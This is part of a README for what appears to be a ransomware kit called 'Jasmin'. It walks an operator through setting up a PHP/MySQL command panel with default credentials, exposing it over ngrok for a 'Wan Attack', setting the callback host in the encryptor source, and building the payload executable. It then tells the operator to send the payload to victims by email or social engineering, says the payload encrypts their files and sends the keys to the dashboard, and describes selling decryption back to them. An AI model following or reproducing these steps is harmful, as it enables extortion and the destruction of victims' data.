  </p>

## Prerequisites üß∞

* **Visual Studio 2019 or later** </br>

* **Xampp Server (Windows) or LAMP Server(Linux)** </br>

* **Ngrok for port forwarding** </br>

## SETUP AND RUNNING üñ•Ô∏è

* ### Clone This Repo
   ```sh
   git clone https://github.com/Transmetal/Ransomware-pt1
   ```
* ### Webserver & Database 
   
    * **Copy the all the files in webpanel directory to htdocs or (/var/www/html)**  
	
	* **Open Mysql Shell** 
	
	* **Login as Root user** 
	```sh
     mysql -h localhost -u root
   ```
    * **Create new database & assign user**
	
	```sh
     CREATE DATABASE jasmin_db;
	 CREATE USER 'jasminadmin'@'localhost' IDENTIFIED BY '123456';
	 GRANT ALL PRIVILEGES ON jasmin_db.* TO 'jasminadmin'@'localhost';
	 Exit
   ```
	
	* **Importing jasmin_db.sql file from database directory** 
	
	```sh
      mysql -u jasminadmin -p123456 jasmin_db < htdocs/database/jasmin_db.sql
    ```
	* **Loggin Dashboard**
     
	 Open Google Chrome and visit http://localhost/ <br>
	 Use default credentials
	```sh
     Username    : siddhant
	 Access Code : 123456
    ```
	
* ### Generating Payload
         
    Note: You should have installed visual studio 2019 or later in your machine		 
	
	* **Use ngrok server for port forwarding (Wan Attack)**
	 
	```sh
     ngrok  http localhost:80
    ```
	
	* **Copy Forwarding Address** 
	
	* **Configure variables** <br>
         * =>   Inside **"Jasmin Encrypter"** directory open "Jasmin Encryptor.sln" file <br>
         * =>   Go to line number 34 & 35 <br>
	     * =>   Set Ngrok host address for **"hostaddr"** & **"AlertMsgLink"** Variable <br>
	
	* **Building .Exe File** <br>
	     * =>   Go to top nav bar & click to build => Clean Solution  <br>
         * =>   Again click to build => Clean Jasmin Encryptor <br>
	     * =>   Once Again click to build button => Rebuild Jasmin Encryptor <br>
		 * =>   Go to **"Jasmin Encryptor\bin\Release"** directory !! Congrats Payload is ready <br>
		 
* ### Next Steps	
    * **Sending File to Victim's Pc** <br>
	     * Replace the email address inside "webpanel/alertmsg.zip/index.html" <br>
	     * Now, Send this Payload file to your victims through emails or any socail other engineering technique you want <br>
		 * When Ever our victim click on that payload file it will encrypt all important files and send the decryption key to our web dashboard <br>
		 * For Custom alert message to your victims, edit the HTML file inside "webpanel/alertmsg.zip" <br>
		 
* ### Decryption Process			  
    * **Decrypting Victims File** <br>
	     * =>   open **"Jasmin decryptor\Jasmin decryptor.sln"** & build the .exe file <br>
         * =>   get the **SystemId** from your victims through emails  <br>
	     * =>   download the Decryption key from web-dashboard for that **SystemId** <br>
		 * =>   reply your victims with Decryption Tool and Passsword File  <br>
